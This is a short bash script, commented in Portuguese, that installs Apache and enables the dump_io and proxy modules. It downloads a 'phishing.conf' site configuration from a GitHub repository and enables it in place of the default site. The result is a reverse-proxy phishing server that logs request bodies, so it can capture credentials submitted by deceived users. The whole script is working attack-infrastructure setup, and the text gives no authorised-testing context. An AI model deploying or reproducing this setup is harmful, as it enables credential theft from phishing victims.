#!/bin/bash

# Antes de rodar o script, aplicar apt update

apt install apache2 -y

a2enmod dump_io
systemctl reload apache2
a2enmod proxy
systemctl reload apache2
a2enmod proxy_http
systemctl reload apache2
a2enmod proxy_connect
systemctl reload apache2

wget https://raw.githubusercontent.com/andreluna/phishing-page/master/phishing.conf -O /etc/apache2/sites-available/phishing.conf

sudo a2dissite 000-default.conf
sudo a2ensite phishing.conf

systemctl restart apache2
systemctl reload apache2
